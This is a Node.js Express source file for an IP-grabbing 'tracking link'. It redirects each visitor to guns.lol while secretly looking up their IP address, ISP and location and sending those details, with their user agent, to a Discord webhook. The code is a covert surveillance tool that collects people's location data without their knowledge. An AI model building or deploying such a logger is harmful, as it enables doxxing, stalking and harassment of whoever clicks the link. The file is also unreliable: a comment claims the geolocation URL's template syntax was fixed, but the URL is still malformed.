import express from 'express';

const app = express(); 

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK; 
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 

app.get('/', async (req, res) => { 
    res.redirect(302, REDIRECT_URL);

    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''; 
    let clientIp = rawIp.replace(/,.*$/, '').trim(); 

    if (clientIp.includes('::ffff:')) { 
        clientIp = clientIp.replace('::ffff:', ''); 
    } 

    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') { 
        clientIp = '8.8.8.8'; 
    } 

    const userAgent = req.headers['user-agent'] || 'Unknown'; 

    if (DISCORD_WEBHOOK_URL) {
        try { 
            // FIXED: Added backtick string formatting with standard variable embedding syntax
            const geoResponse = await fetch(`https://ipwho.is{clientIp}`); 
            const geoData = await geoResponse.json(); 

            const ispName = geoData.connection?.isp || "Unknown ISP"; 
            const cityName = geoData.city || "Unknown City"; 
            const countryName = geoData.country || "Unknown Country"; 

            const discordPayload = { 
                embeds: [{ 
                    title: "Visitor Logged", 
                    color: 15548997, 
                    description: "A user has accessed the tracking link.", 
                    fields: [ 
                        { name: "IP Address", value: "`" + clientIp + "`", inline: true }, 
                        { name: "ISP Network", value: "`" + ispName + "`", inline: true }, 
                        { name: "Location", value: "`" + cityName + ", " + countryName + "`", inline: false }, 
                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false } 
                    ], 
                    footer: { text: "System Monitor" }, 
                    timestamp: new Date().toISOString() 
                }] 
            }; 

            await fetch(DISCORD_WEBHOOK_URL, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify(discordPayload) 
            }); 
        } catch (error) { 
            console.error("Background Logger Failed gracefully:", error); 
        } 
    } 
}); 

const PORT = process.env.PORT || 10000; 
app.listen(PORT, () => { 
    console.log(`Server running on port ${PORT}`); 
});
